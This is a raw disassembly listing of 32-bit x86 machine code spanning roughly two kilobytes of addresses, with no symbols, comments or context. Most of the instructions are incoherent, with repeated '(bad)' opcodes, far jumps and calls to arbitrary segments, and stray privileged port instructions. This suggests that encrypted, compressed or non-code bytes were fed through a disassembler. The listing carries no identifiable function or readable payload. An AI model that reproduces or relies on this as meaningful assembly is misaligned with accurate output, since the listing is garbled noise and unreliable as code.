  4162c2:	jbe    0x4162ce
  4162c4:	iret   
  4162c5:	shr    ah,0x44
  4162c8:	mov    dl,0x50
  4162ca:	cld    
  4162cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162cc:	pop    esi
  4162cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ce:	mov    bh,0xd8
  4162d0:	inc    esp
  4162d1:	bound  ebx,QWORD PTR [ecx+0x486a58bd]
  4162d7:	pop    esi
  4162d8:	pop    esi
  4162d9:	imul   edi,DWORD PTR gs:[ecx+0x4d],0x7f
  4162de:	or     BYTE PTR [ecx],0x3b
  4162e1:	push   esi
  4162e2:	repnz or al,0xfe
  4162e5:	cmp    ebp,DWORD PTR [ecx-0x7f98c937]
  4162eb:	in     al,dx
  4162ec:	sbb    al,0xbb
  4162ee:	sub    al,0xc9
  4162f0:	dec    esi
  4162f1:	in     eax,0x5a
  4162f3:	or     cl,cl
  4162f5:	mov    ds:0x56081d2,al
  4162fa:	and    dl,al
  4162fc:	rol    BYTE PTR [ebx-0x18],cl
  4162ff:	jmp    0x7fe9:0xa7ffdb62
  416306:	je     0x4162e6
  416308:	out    0x1e,eax
  41630a:	lds    esp,FWORD PTR [edx-0x1ebcab30]
  416310:	daa    
  416311:	xor    DWORD PTR [ecx+edx*4-0xe],esi
  416315:	(bad)  
  416316:	mov    bl,0xf2
  416318:	sub    DWORD PTR [edx-0x244d6ca],eax
  41631e:	les    eax,FWORD PTR [ebp-0x355f3935]
  416324:	sti    
  416325:	out    0x59,al
  416327:	mov    esi,0xb2d3288c
  41632c:	mov    al,ds:0x2c293634
  416331:	add    esp,ecx
  416333:	stos   DWORD PTR es:[edi],eax
  416334:	mov    ebp,0xf6a50d05
  416339:	fdiv   QWORD PTR [ecx]
  41633b:	or     ebx,edx
  41633d:	xchg   ebp,eax
  41633e:	rcr    ebx,0x6
  416341:	stos   BYTE PTR es:[edi],al
  416342:	cmc    
  416343:	mov    ebx,0xd1552f6a
  416348:	test   BYTE PTR [ecx],ah
  41634a:	sub    eax,0x32bcd31c
  41634f:	xchg   ebp,esi
  416351:	add    BYTE PTR [ebx-0x78],bl
  416354:	(bad)  
  416355:	push   ebp
  416356:	or     BYTE PTR [ecx+0x26d33bf9],bh
  41635c:	add    eax,0xf10c3d16
  416361:	pop    ds
  416362:	mov    WORD PTR [ebx],?
  416364:	pusha  
  416365:	(bad)  
  416367:	test   dh,ah
  416369:	cwde   
  41636a:	sahf   
  41636b:	aaa    
  41636c:	and    esp,edx
  41636e:	adc    esp,ebx
  416370:	scas   eax,DWORD PTR es:[edi]
  416371:	in     al,0xd9
  416373:	pushw  0x9531
  416377:	sbb    al,0x0
	...
  416545:	add    BYTE PTR [eax],al
  416547:	add    al,ch
  416549:	shl    BYTE PTR [edi+0x76],1
  41654c:	jg     0x416545
  41654e:	stc    
  41654f:	ficom  WORD PTR [ebp+0x2e]
  416552:	inc    esp
  416553:	and    al,0xa5
  416555:	sar    BYTE PTR [ecx+ebx*4],cl
  416558:	sub    DWORD PTR [eax+0x1],esi
  41655b:	add    BYTE PTR [edx],ah
  41655d:	pop    es
  41655e:	add    BYTE PTR [eax],al
  416560:	jle    0x416568
  416562:	aas    
  416563:	inc    esi
  416564:	scas   al,BYTE PTR es:[edi]
  416565:	(bad)  
  416566:	test   esi,0xee76ef63
  41656c:	ror    DWORD PTR [ecx-0x72],0x31
  416570:	inc    esp
  416571:	stos   DWORD PTR es:[edi],eax
  416572:	es xchg esp,eax
  416574:	add    BYTE PTR [edx*8-0x7dc966fe],0x2f
  41657c:	push   ebp
  41657d:	push   cs
  41657e:	popf   
  41657f:	pop    esi
  416580:	jle    0x4165ad
  416582:	hlt    
  416583:	enter  0x9e49,0x65
  416587:	and    ah,BYTE PTR [edx+0x38fdb1a0]
  41658d:	rcl    BYTE PTR [ecx-0x237b6506],0xf2
  416594:	test   DWORD PTR [ebp-0x6],esp
  416597:	pop    ebp
  416598:	imul   ecx,esp,0x6e
  41659b:	sti    
  41659c:	das    
  41659d:	xchg   BYTE PTR [edx-0x52702141],dh
  4165a3:	push   0xf
  4165a5:	jne    0x4165fe
  4165a7:	jbe    0x4165a1
  4165a9:	sbb    eax,0xe1fb1f16
  4165ae:	sub    bl,BYTE PTR [ebx+ebp*8]
  4165b1:	cmp    eax,0x7600c4ee
  4165b6:	inc    ebp
  4165b7:	mul    bl
  4165b9:	outs   dx,BYTE PTR ds:[esi]
  4165ba:	(bad)  
  4165bb:	or     DWORD PTR [edx-0x78],eax
  4165be:	mov    ds:0x85903533,al
  4165c3:	test   al,0xfe
  4165c5:	push   esp
  4165c6:	ss push es
  4165c8:	add    DWORD PTR [ebp-0x2d],edi
  4165cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165cc:	lahf   
  4165cd:	xchg   edx,eax
  4165ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165cf:	cmp    esi,DWORD PTR [ecx-0x6fc27cb5]
  4165d5:	cmp    al,BYTE PTR [ecx-0x3817acab]
  4165db:	ret    
  4165dc:	outs   dx,BYTE PTR ds:[esi]
  4165dd:	cmp    edx,DWORD PTR [ecx+ebp*2+0x24]
  4165e1:	ins    BYTE PTR es:[edi],dx
  4165e2:	frstor gs:0xc910cd55
  4165e9:	push   cs
  4165ea:	dec    ebx
  4165eb:	push   ebp
  4165ec:	popa   
  4165ed:	int    0x7b
  4165ef:	in     eax,dx
  4165f0:	mov    ds:0xf178693,eax
  4165f5:	mov    DWORD PTR [ebp-0xaf32fc5],esi
  4165fb:	push   edi
  4165fc:	sti    
  4165fd:	sbb    DWORD PTR [edx+0x74dad7d3],ebx
  416603:	test   esi,eax
  416605:	ss pop edx
  416607:	xchg   BYTE PTR [ecx],dh
  416609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41660a:	inc    ebx
  41660b:	or     DWORD PTR [edi+0x6e2fe8d0],esi
  416611:	and    BYTE PTR [eax-0x41],bl
  416614:	jecxz  0x416651
  416616:	scas   eax,DWORD PTR es:[edi]
  416617:	test   eax,0x5399ae27
  41661c:	sub    ecx,DWORD PTR [ecx]
  41661e:	and    cl,ah
  416620:	xchg   ebx,eax
  416621:	sbb    BYTE PTR [ebx+0x13],ch
  416624:	adc    ebx,DWORD PTR [ebx+0x36]
  416627:	mov    edi,0x8dd2247d
  41662c:	pop    esi
  41662d:	stc    
  41662e:	pop    ss
  41662f:	jmp    0x416648
  416631:	daa    
  416632:	scas   eax,DWORD PTR es:[edi]
  416633:	arpl   WORD PTR [ebx+ecx*1],ax
  416636:	imul   ebp,DWORD PTR [esi],0x3e
  416639:	std    
  41663a:	aaa    
  41663b:	inc    edx
  41663c:	sti    
  41663d:	cmp    BYTE PTR [ebp+0x1f8165a],dh
  416643:	adc    DWORD PTR [eax+0x7d],ebp
  416646:	sub    DWORD PTR [eax+0x31],edi
  416649:	xor    eax,0xf2e23e8d
  41664e:	add    ah,bh
  416650:	push   eax
  416651:	adc    DWORD PTR [esi+0x21],edi
  416654:	fisub  DWORD PTR ds:0xe807bf0e
  41665a:	in     eax,0x9d
  41665c:	mov    ebp,DWORD PTR [eax]
  41665e:	xor    al,0x15
  416660:	inc    ecx
  416661:	sbb    ecx,DWORD PTR [ebx+ebp*8+0x35]
  416665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416666:	adc    ch,BYTE PTR [ecx-0x1ec82d2b]
  41666c:	sub    al,0x7f
  41666e:	ffree  st(3)
  416670:	daa    
  416671:	stos   BYTE PTR es:[edi],al
  416672:	test   eax,0x810e77b4
  416677:	in     al,0xe9
  416679:	sub    DWORD PTR [esi+ebx*2+0x7f],0xf27c771a
  416681:	test   ah,dh
  416683:	in     eax,0x28
  416685:	(bad)  
  416686:	adc    esi,DWORD PTR ds:0x21f2f7dd
  41668c:	mov    ebx,0x74c2af99
  416691:	call   0x3097:0xf71bd2
  416698:	nop
  416699:	cmp    ebx,DWORD PTR [edx]
  41669b:	lock and ch,dl
  41669e:	pop    es
  41669f:	or     bh,BYTE PTR [ebp-0x1a]
  4166a2:	imul   esp,DWORD PTR [esi+0xbd30337],0xffffffb9
  4166a9:	xor    al,0x72
  4166ab:	rcl    BYTE PTR [ecx-0x3dcb1cc6],0xd7
  4166b2:	mov    bl,0x2a
  4166b4:	sahf   
  4166b5:	mov    dh,0x82
  4166b7:	xor    BYTE PTR [edi-0x4b],cl
  4166ba:	and    BYTE PTR [esi],ah
  4166bc:	push   es
  4166bd:	mov    esp,0xda50fc9d
  4166c2:	cmp    BYTE PTR [edx-0x43],bl
  4166c5:	or     DWORD PTR [esi],esi
  4166c7:	scas   eax,DWORD PTR es:[edi]
  4166c8:	lea    edi,[edx-0xe]
  4166cb:	inc    eax
  4166cc:	add    al,0x3
  4166ce:	or     al,0xe3
  4166d0:	push   edx
  4166d1:	cli    
  4166d2:	and    eax,0xd799da73
  4166d7:	repz xchg esp,eax
  4166d9:	dec    esi
  4166da:	lds    edx,FWORD PTR [ebx+0x786347b1]
  4166e0:	call   0x3bb:0x9a850961
  4166e7:	addr16 int3 
  4166e9:	sbb    esp,DWORD PTR [ecx*8-0x13a7fd9]
  4166f0:	or     edi,esi
  4166f2:	and    BYTE PTR [edi+esi*2-0x5d],cl
  4166f6:	pusha  
  4166f7:	cli    
  4166f8:	jae    0x41674b
  4166fa:	aas    
  4166fb:	xchg   esi,eax
  4166fc:	(bad)  
  4166fd:	je     0x4166f4
  4166ff:	sub    ah,BYTE PTR [ebx]
  416701:	lea    edi,[ebx+esi*1+0x38aa062a]
  416708:	mov    esi,0xeafac414
  41670d:	push   cs
  41670e:	jbe    0x4166fa
  416710:	push   ebp
  416711:	xchg   ecx,eax
  416712:	(bad)  
  416713:	pop    ds
  416714:	and    BYTE PTR [edx+0x1d37bb26],bh
  41671a:	fnsave [ebp-0x6]
  41671d:	aas    
  41671e:	sub    DWORD PTR [ecx],ebp
  416720:	fdiv   DWORD PTR [esi]
  416722:	dec    ebp
  416723:	dec    esp
  416724:	ficomp WORD PTR [edi]
  416726:	pop    esi
  416727:	sbb    DWORD PTR [ebx-0x535cd31],ebp
  41672d:	xchg   esi,eax
  41672e:	pop    edi
  41672f:	xor    BYTE PTR [edi],0x41
  416732:	mov    ch,0x5a
  416734:	int    0x1c
  416736:	xor    edi,DWORD PTR [ebx]
  416738:	jbe    0x41676d
  41673a:	xchg   ebp,eax
  41673b:	popa   
  41673c:	cld    
  41673d:	retf   
  41673e:	adc    BYTE PTR [ebx+0x4d50bce4],bl
  416744:	test   eax,0x42372de
  416749:	leave  
  41674a:	xor    eax,0xcd41db7b
  41674f:	sbb    al,BYTE PTR [ebx]
  416751:	mov    ah,0x5f
  416753:	pop    edx
  416754:	sub    dh,BYTE PTR [ecx-0x41]
  416757:	xor    BYTE PTR [esi+0x534ca03d],dl
  41675d:	jmp    0x416746
  41675f:	lock mov cl,BYTE PTR es:[ebp+ebx*4-0x7aa15a31]
  416768:	scas   eax,DWORD PTR es:[edi]
  416769:	sub    al,0xfa
  41676b:	inc    edx
  41676c:	xchg   edx,eax
  41676d:	mov    esi,DWORD PTR [ecx+0x3e]
  416770:	mov    eax,ds:0xdbcf9f00
  416775:	mov    esp,0xcc831547
  41677a:	mov    ebp,0xb522995b
  41677f:	cmp    ebx,DWORD PTR [ecx-0x26b75e10]
  416785:	sbb    eax,0x8e273393
  41678a:	and    al,0x5b
  41678c:	inc    BYTE PTR [eax]
  41678e:	inc    edx
  41678f:	mov    bh,0x6c
  416791:	call   0x6f3b:0x76d15832
  416798:	pop    ss
  416799:	push   edx
  41679a:	mov    ebp,0x55368ee2
  41679f:	xchg   BYTE PTR [ecx+esi*4],al
  4167a2:	clc    
  4167a3:	adc    eax,0xdc3c7f52
  4167a8:	jge    0x416774
  4167aa:	neg    DWORD PTR [esp+ebx*2+0x2213ca0a]
  4167b1:	shl    DWORD PTR [edx],cl
  4167b3:	inc    ecx
  4167b4:	stos   DWORD PTR es:[edi],eax
  4167b5:	iret   
  4167b6:	sub    esp,DWORD PTR [ebx+esi*1]
  4167b9:	mov    ecx,DWORD PTR [ebp+eiz*1+0x3d5c7632]
  4167c0:	je     0x416761
  4167c2:	and    ch,BYTE PTR [ebp+0x49]
  4167c5:	dec    ebp
  4167c6:	scas   eax,DWORD PTR es:[edi]
  4167c7:	dec    esp
  4167c8:	xchg   edx,eax
  4167c9:	fs jge 0x4167fd
  4167cc:	out    0x88,eax
  4167ce:	in     al,0x9d
  4167d0:	sar    DWORD PTR [edx],1
  4167d2:	mov    esp,esp
  4167d4:	push   esp
  4167d5:	sbb    DWORD PTR [edx+0x240f22eb],edi
  4167db:	retf   0xd581
  4167de:	add    ch,BYTE PTR [ecx]
  4167e0:	ins    DWORD PTR es:[edi],dx
  4167e1:	mov    WORD PTR [ebx-0x75],fs
  4167e4:	cmp    DWORD PTR [eax+eax*4+0x3cb03245],ebx
  4167eb:	inc    esp
  4167ec:	arpl   WORD PTR [ebx+0x365d8329],ax
  4167f2:	mov    dl,BYTE PTR [esp+eiz*8-0x59f3d8b8]
  4167f9:	fmul   st,st(7)
  4167fb:	psubsw mm1,QWORD PTR ds:0x3cc23d40
  416802:	es jb  0x41680f
  416805:	mov    al,ds:0x737640f1
  41680a:	sar    BYTE PTR [esi+0x50fde0bd],0x72
  416811:	sub    dl,BYTE PTR [esi]
  416813:	push   esp
  416814:	lods   eax,DWORD PTR ds:[esi]
  416815:	ficomp DWORD PTR ss:[ebp+eiz*2-0x41]
  41681a:	or     al,0xff
  41681c:	xchg   DWORD PTR [edx+0x59],edx
  41681f:	dec    edx
  416820:	rol    edx,0x22
  416823:	and    ebx,0xc9f3a6ab
  416829:	test   al,0x51
  41682b:	push   ebp
  41682c:	or     edi,DWORD PTR [esi+0x31707e4d]
  416832:	mov    bl,BYTE PTR [eax+0x3]
  416835:	inc    ecx
  416836:	ret    0x7063
  416839:	sbb    DWORD PTR [ebx+0x30],0xffffffb6
  41683d:	and    eax,0x6ac8672d
  416842:	xchg   ebp,eax
  416843:	retf   
  416844:	inc    esp
  416845:	cwde   
  416846:	mov    al,0x0
  416848:	ins    BYTE PTR es:[edi],dx
  416849:	es shl edx,cl
  41684c:	inc    ebp
  41684d:	fisub  WORD PTR [esi]
  41684f:	inc    esp
  416850:	pushf  
  416851:	(bad)  
  416852:	mov    ebp,0x33ee4e5d
  416857:	lods   eax,DWORD PTR ds:[esi]
  416858:	jne    0x416829
  41685a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41685b:	mov    DWORD PTR es:[ecx],ebx
  41685e:	cmp    DWORD PTR [ebp+0x7d],0xffffffda
  416862:	jae    0x41683b
  416864:	cli    
  416865:	jbe    0x416880
  416867:	jl     0x416861
  416869:	adc    esp,edx
  41686b:	fsubr  QWORD PTR [ebx+edx*8]
  41686e:	(bad)  
  41686f:	mov    edx,0x7b7cff9b
  416874:	xchg   esp,eax
  416875:	rcl    DWORD PTR ds:0x23c76246,0x79
  41687c:	jmp    0x41687c
  41687e:	in     al,0x21
  416880:	pusha  
  416881:	sub    BYTE PTR [esi-0x19071f1],bl
  416887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416888:	jge    0x4168e4
  41688a:	dec    ebp
  41688b:	lods   al,BYTE PTR ds:[esi]
  41688c:	xor    ebx,esp
  41688e:	mov    ah,0x39
  416890:	not    BYTE PTR [edi+0x48f8681]
  416896:	cdq    
  416897:	mov    edi,0x57f2289e
  41689c:	retf   0xad96
  41689f:	lods   eax,DWORD PTR ds:[esi]
  4168a0:	clc    
  4168a1:	outs   dx,DWORD PTR ds:[esi]
  4168a2:	lods   al,BYTE PTR ds:[esi]
  4168a3:	ror    BYTE PTR cs:0xcda216e4,0xf7
  4168ab:	add    eax,0xbd8ae9cf
  4168b0:	cmp    eax,0x28bc7d41
  4168b5:	jmp    0x41688b
  4168b7:	data16 into 
  4168b9:	or     al,0xfa
  4168bb:	inc    edx
  4168bc:	rcr    DWORD PTR [ecx+0x50385291],cl
  4168c2:	fisubr DWORD PTR [edx+0x7e3ee1b9]
  4168c8:	arpl   si,cx
  4168ca:	add    dh,BYTE PTR [ecx]
  4168cc:	or     al,0x59
  4168ce:	inc    edi
  4168cf:	les    esp,FWORD PTR [ebx+0x18]
  4168d2:	test   BYTE PTR [eax+0x4e0ce23a],0x6e
  4168d9:	mov    ds:0x36318179,al
  4168de:	adc    DWORD PTR [edx],ebp
  4168e0:	xor    al,0xb5
  4168e2:	inc    eax
  4168e3:	adc    al,0x71
  4168e5:	retf   
  4168e6:	scas   eax,DWORD PTR es:[edi]
  4168e7:	cmp    BYTE PTR [edi+0x6ba453fd],0x58
  4168ee:	pop    ds
  4168ef:	jmp    0x4b2e:0x6805d910
  4168f6:	add    BYTE PTR ss:[edx],bh
  4168f9:	enter  0xcd7d,0x98
  4168fd:	and    edi,ecx
  4168ff:	mov    ah,0x4c
  416901:	dec    ecx
  416902:	mov    edi,0xe2478826
  416907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416908:	popf   
  416909:	adc    ah,BYTE PTR [esi-0x8]
  41690c:	jae    0x4168fe
  41690e:	mov    ebp,0x3ed43572
  416913:	and    dh,BYTE PTR [ecx]
  416915:	popf   
  416916:	fisub  DWORD PTR [edi-0x1d]
  416919:	sbb    BYTE PTR [eax-0x3f],al
  41691c:	jns    0x4168fc
  41691e:	cdq    
  41691f:	add    DWORD PTR [edi+0x477786d4],0xffffffc4
  416926:	jmp    0x416901
  416928:	fstp   QWORD PTR [ebx]
  41692a:	jne    0x41690c
  41692c:	sbb    ebx,DWORD PTR [ebx]
  41692e:	mov    bh,0x68
  416930:	xchg   ebx,eax
  416931:	call   DWORD PTR [ebp+0x32]
  416934:	enter  0x879a,0x20
  416938:	shr    BYTE PTR [ebx+0x305bb26c],cl
  41693e:	test   DWORD PTR [esi-0x60c5fdbd],0x80568b75
  416948:	mov    ebx,gs
  41694a:	cmp    DWORD PTR [edx+0x24],edi
  41694d:	cmp    BYTE PTR [ecx-0x70],0xfc
  416951:	push   esp
  416952:	cmc    
  416953:	stc    
  416954:	cmp    BYTE PTR [esi],dl
  416956:	jae    0x4169a0
  416958:	repz in al,0x3e
  41695b:	or     DWORD PTR [esi],edx
  41695d:	jl     0x416988
  41695f:	xchg   edx,eax
  416960:	aam    0x5
  416962:	cmp    DWORD PTR [edi+0x3c1d1e0c],ebp
  416968:	loopne 0x41696a
  41696a:	mov    edi,0x5742cddd
  41696f:	mov    ah,BYTE PTR [ebp+ebx*1+0x48]
  416973:	jmp    0x8dbb5264
  416978:	pop    edx
  416979:	jle    0x4169a7
  41697b:	adc    al,BYTE PTR [ebx+ebp*8]
  41697e:	jae    0x416969
  416980:	xor    DWORD PTR [edx-0x7ca04cdc],edi
  416986:	out    0x5b,eax
  416988:	nop
  416989:	(bad)  [ecx-0xadea82c]
  41698f:	jnp    0x4169f8
  416991:	mov    edi,0xa3851920
  416996:	xchg   BYTE PTR [ecx+ecx*1+0x29],bh
  41699a:	js     0x416984
  41699c:	pop    es
  41699d:	dec    esp
  41699e:	fisub  WORD PTR [esi-0x4]
  4169a1:	pop    ss
  4169a2:	xchg   esi,eax
  4169a3:	sbb    ebx,DWORD PTR [eax]
  4169a5:	or     al,0x27
  4169a7:	lea    eax,[eax+0x45]
  4169aa:	and    BYTE PTR [edi],dh
  4169ac:	cmp    ecx,DWORD PTR [ebp+0x24]
  4169af:	mov    ebx,DWORD PTR [ebx-0x109c6393]
  4169b5:	in     eax,0x59
  4169b7:	fstp   TBYTE PTR [ebx]
  4169b9:	sub    esp,0x13e038d
  4169bf:	mov    bh,0x32
  4169c1:	adc    al,0xfd
  4169c3:	(bad)  
  4169c4:	(bad)
  4169c7:	jmp    0x2b72:0xb9cc4f52
  4169ce:	adc    ch,BYTE PTR gs:[ebx]
  4169d1:	mov    ebp,0x3826aade
  4169d6:	jp     0x416a1b
  4169d8:	mov    al,0xe1
  4169da:	fcom   DWORD PTR [esi]
  4169dc:	cmp    ebp,DWORD PTR gs:[edx]
  4169df:	pop    ecx
  4169e0:	mov    esi,0x5320ca54
  4169e5:	popf   
  4169e6:	cld    
  4169e7:	test   eax,0xdf067a42
  4169ec:	push   ecx
  4169ed:	adc    edx,edx
  4169ef:	cdq    
  4169f0:	stos   BYTE PTR es:[edi],al
  4169f1:	jecxz  0x416a64
  4169f3:	xor    dl,BYTE PTR [ecx-0x5e]
  4169f6:	shr    bl,0x60
  4169f9:	push   ds
  4169fa:	es or  al,0x57
  4169fd:	cld    
  4169fe:	daa    
  4169ff:	mov    ?,WORD PTR [edx-0x52]
  416a02:	lods   al,BYTE PTR ds:[esi]
  416a03:	cs push 0xffffffc6
  416a06:	push   0xffffffa9
  416a08:	push   esi
  416a09:	inc    edi
  416a0a:	xlat   BYTE PTR ds:[ebx]
  416a0b:	shr    ah,1
  416a0d:	mov    DWORD PTR [ebp-0x7c5cc082],edx
  416a13:	retf   
  416a14:	scas   al,BYTE PTR es:[edi]
  416a15:	sahf   
  416a16:	ds mov ecx,ebx
  416a19:	mov    bh,0xe1
  416a1b:	ss push cs
  416a1d:	test   al,0x6e
  416a1f:	inc    edx
  416a20:	and    DWORD PTR [edi+0x123e9a37],edx
  416a26:	pop    ds
  416a27:	and    bl,BYTE PTR [esi]
  416a29:	out    dx,al
  416a2a:	call   0xed3607cc
  416a2f:	mov    eax,0x62e76817
  416a34:	fldcw  WORD PTR [esi+0x6d]
  416a37:	je     0x416a54
  416a39:	jmp    0x6ae3:0x20f90e73
  416a40:	xchg   DWORD PTR [ebx-0x42],ebx
  416a43:	jae    0x416a4b
  416a45:	mov    ah,0x7b
  416a47:	jmp    0x29d9:0x569891be
  416a4e:	xchg   edi,eax
  416a4f:	and    eax,0xb2071b2a
  416a54:	(bad)  
  416a55:	mov    ds:0xf161eb8b,al
  416a5a:	dec    ebp
  416a5b:	mov    esi,0xd961d086
  416a60:	iret   
  416a61:	jmp    0x416a87
  416a63:	lds    edx,FWORD PTR [edx+0x2a7149aa]
  416a69:	stos   BYTE PTR es:[edi],al
  416a6a:	fst    DWORD PTR [ecx-0x2e0e9554]
  416a70:	in     al,dx
  416a71:	cmp    dh,BYTE PTR [eax+0x3f]
  416a74:	add    edx,ebp
  416a76:	dec    ebx
  416a77:	ja     0x416a35
  416a79:	es add al,0x7e
  416a7c:	das    
  416a7d:	nop
  416a7e:	lods   al,BYTE PTR ds:[esi]
  416a7f:	fistp  WORD PTR [eax-0x5a]
  416a82:	push   ds
  416a83:	aad    0xa6
  416a85:	mov    ebp,ebp
  416a87:	xchg   ebx,eax
  416a88:	lods   al,BYTE PTR ds:[esi]
  416a89:	fisttp WORD PTR [ecx-0x10]
  416a8c:	mov    eax,ds:0xee94465c
  416a91:	das    
  416a92:	fs xchg ebp,eax
  416a94:	gs out dx,eax
  416a96:	out    0xc7,eax
  416a98:	cmp    BYTE PTR [ebx-0x27],ah
  416a9b:	dec    ebx
  416a9c:	add    edi,DWORD PTR [esi-0x5e]
  416a9f:	mov    WORD PTR [edi+0x2de60c17],?
  416aa5:	jle    0x416a36
  416aa7:	xchg   edx,eax
  416aa8:	sub    edi,eax
  416aaa:	retf   
  416aab:	and    DWORD PTR [ebx],ebx
  416aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aae:	sub    al,BYTE PTR [ebp+0x5f509c53]
  416ab4:	pusha  
  416ab5:	ret    0x3073
  416ab8:	jbe    0x416ab1
  416aba:	fcmovnbe st,st(1)
  416abc:	cmp    eax,0xd2bff147
  416ac1:	lods   eax,DWORD PTR ds:[esi]
  416ac2:	daa    
  416ac3:	pop    eax
  416ac4:	cmp    al,bl
  416ac6:	push   ecx
  416ac7:	ret    
  416ac8:	into   
  416ac9:	xchg   edx,eax
  416aca:	popa   
  416acb:	xor    al,0xa8
  416acd:	mov    edi,0x251247dc
  416ad2:	inc    ebx
  416ad3:	mov    ah,0xa0
  416ad5:	jns    0x416abf
  416ad7:	test   eax,0x102f4113
  416adc:	fdiv   DWORD PTR [ebx]
  416ade:	leave  
  416adf:	adc    esp,ebp
  416ae1:	and    BYTE PTR [ecx-0x59],0x6b
  416ae5:	mov    eax,0xe1898587
  416aea:	scas   al,BYTE PTR es:[edi]
  416aeb:	mov    bh,0x5d
  416aed:	xor    BYTE PTR ds:0x68153d55,0xbe
  416af4:	add    ebp,DWORD PTR [edx+0x6f]
  416af7:	pushf  
  416af8:	inc    esi
  416af9:	cli    
  416afa:	xchg   BYTE PTR [edx+0x7d],bh
  416afd:	test   DWORD PTR [esi-0x4d32e6f3],edx
  416b03:	xor    eax,0x11776ec
  416b08:	adc    DWORD PTR [edx],ecx
  416b0a:	into   
  416b0b:	and    BYTE PTR [edi+0x59],ch
  416b0e:	and    ebx,edx
  416b10:	jge    0x416b73
  416b12:	mov    ds:0xd425ac88,al
  416b17:	mov    edx,eax
  416b19:	test   DWORD PTR [edx-0x1f],ebp
  416b1c:	xor    eax,0x67565995
  416b21:	push   esp
  416b22:	adc    BYTE PTR [edi],cl
  416b24:	inc    ebp
  416b25:	or     eax,DWORD PTR [ecx+0x584148af]
  416b2b:	jno    0x416b3d
  416b2d:	in     al,0x18
  416b2f:	loope  0x416b66
  416b31:	les    ebx,FWORD PTR [ebx-0x3d]
  416b34:	xchg   ebx,eax
  416b35:	ror    ebx,0xff
  416b38:	shl    DWORD PTR [edi+0x1d],cl
  416b3b:	ins    BYTE PTR es:[edi],dx
  416b3c:	cdq    
  416b3d:	ins    DWORD PTR es:[edi],dx
  416b3e:	into   
  416b3f:	fld    QWORD PTR ds:0x43d5652d
  416b45:	hlt    
  416b46:	lahf   
  416b47:	ffreep st(6)
  416b49:	aaa    
  416b4a:	push   0xffffff9f
  416b4c:	push   edx
  416b4d:	add    dh,BYTE PTR [edx-0x4c]
  416b50:	scas   eax,DWORD PTR es:[edi]
  416b51:	or     BYTE PTR [edi-0x5eeaa28f],bh
  416b57:	sbb    bh,bl
  416b59:	sub    DWORD PTR [edi],ebx
  416b5b:	nop
  416b5c:	js     0x416bd3
  416b5e:	pushf  
  416b5f:	aaa    
  416b60:	mov    esp,0xd18de5fa
  416b65:	push   ds
  416b66:	daa    
  416b67:	sti    
  416b68:	lods   al,BYTE PTR ds:[esi]
  416b69:	das    
  416b6a:	aaa    
  416b6b:	bound  edi,QWORD PTR [ebx-0x11e06435]
  416b71:	bound  ecx,QWORD PTR [ecx]
  416b73:	das    
  416b74:	icebp  
  416b75:	(bad)  
  416b76:	mov    edx,0xf6159ed8
  416b7b:	enter  0x41c1,0x4f
  416b7f:	xchg   ecx,eax
  416b80:	leave  
  416b81:	cmp    bh,BYTE PTR [ebx-0x7ba6408f]
  416b87:	jl     0x416b66
  416b89:	xchg   ebx,eax
  416b8a:	mov    cl,0x4e
  416b8c:	xchg   ecx,eax
  416b8d:	sbb    eax,0xc72761e0
  416b92:	fsubp  st(5),st
  416b94:	push   ss
  416b95:	mov    ds:0xa6374e5,al
  416b9a:	js     0x416be1
  416b9c:	lods   al,BYTE PTR ds:[esi]
  416b9d:	jno    0x416b2e
  416b9f:	fs jg  0x416b35
  416ba2:	sub    eax,0xa3665394
  416ba7:	gs push 0x5ffd9447
  416bad:	xchg   ecx,eax
  416bae:	push   es
  416baf:	outs   dx,BYTE PTR ds:[esi]
  416bb0:	sbb    al,BYTE PTR [edx]
  416bb2:	xor    al,0x74
  416bb4:	cmp    al,0x89
  416bb6:	in     al,dx
  416bb7:	mov    ch,0x1d
  416bb9:	mov    dl,0x1b
  416bbb:	push   ss
  416bbc:	leave  
  416bbd:	idiv   DWORD PTR [edi+0x39303c35]
  416bc3:	lods   al,BYTE PTR ds:[esi]
  416bc4:	cmp    bl,BYTE PTR [ecx-0x76c0e41d]
  416bca:	cmp    al,BYTE PTR [ebx-0x2481937a]
  416bd0:	lds    ecx,FWORD PTR [esi]
  416bd2:	pop    esp
  416bd3:	push   ebx
  416bd4:	lods   eax,DWORD PTR ds:[esi]
  416bd5:	push   0x10
  416bd7:	pop    edx
  416bd8:	cmp    DWORD PTR [ebx-0x9781853],edi
  416bde:	cmp    edx,ebp
  416be0:	(bad)  
  416be2:	fist   WORD PTR [edx+0x3140d879]
  416be8:	add    eax,ebx
  416bea:	pop    ss
  416beb:	cmp    al,BYTE PTR [ebp-0x32]
  416bee:	hlt    
  416bef:	jns    0x416c33
  416bf1:	pop    ecx
  416bf2:	pop    eax
  416bf3:	and    BYTE PTR [edx+0x465d635d],dl
  416bf9:	push   esi
  416bfa:	pusha  
  416bfb:	cwde   
  416bfc:	push   ss
  416bfd:	popa   
  416bfe:	or     ecx,DWORD PTR [eax+0x6cb09d17]
  416c04:	rol    BYTE PTR gs:[esi+0x40],0x56
  416c09:	or     cl,BYTE PTR [edi]
  416c0b:	clc    
  416c0c:	lea    esi,[edx+0x50]
  416c0f:	jp     0x416bf2
  416c11:	mov    ah,0xf9
  416c13:	dec    ebp
  416c14:	add    eax,DWORD PTR [ecx-0x30]
  416c17:	int    0xb5
  416c19:	mov    al,ds:0xd58bc30
  416c1e:	push   ds
  416c1f:	cmp    dh,BYTE PTR [eax]
  416c21:	xor    BYTE PTR [edi],0xc
  416c24:	inc    esi
  416c25:	xor    eax,0x217bc946
  416c2a:	fisttp QWORD PTR [ecx+0x6c7eec0a]
  416c30:	(bad)  
  416c31:	mov    ds:0x2f84da1,al
  416c36:	sahf   
  416c37:	test   ah,ch
  416c39:	fwait
  416c3a:	and    eax,DWORD PTR [edi-0x6b]
  416c3d:	shl    DWORD PTR [edx],1
  416c3f:	xchg   esi,eax
  416c40:	xchg   edi,eax
  416c41:	xchg   esi,eax
  416c42:	popf   
